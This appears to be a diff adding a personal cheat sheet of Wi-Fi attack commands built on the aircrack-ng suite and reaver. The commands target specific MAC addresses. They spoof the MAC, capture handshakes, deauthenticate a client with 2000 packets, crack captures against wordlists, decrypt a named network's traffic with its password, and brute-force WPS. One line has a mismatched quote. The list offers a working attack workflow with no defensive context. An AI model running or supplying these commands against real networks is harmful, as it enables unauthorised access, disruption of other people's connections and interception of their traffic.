@@ -1,0 +1,28 @@
+airmon-ng 
+
+macchanger -r wlan1
+
+airmon-ng check kill
+
+airmon-ng start wlan1
+
+airodump-ng wlan1mon
+
+airodump-ng --bssid AC:A3:1E:27:93:00 wlan1mon
+
+airodump-ng --channel 6 --bssid AC:A3:1E:27:C7:20 wlan1mon
+
+airodump-ng --channel 6 --bssid AC:A3:1E:27:C7:20 --write Desktop/Captures wlan1mon
+
+aireplay-ng --deauth 2000 -a AC:A3:1E:27:C7:20 -c D0:53:49:59:64:77 wlan1mon
+
+aircrack-ng Desktop/Captures/asdas.cap 	-w Desktop/Lists/asdad.txt
+
+airdecap-ng -e 'BUCKWIFI" -p bacon123 asda.cap
+
+reaver -i wlan0mon -b AC:A3:1E:27:93:00 -c 1 -f -a -w -vv
+
+
+
+
+
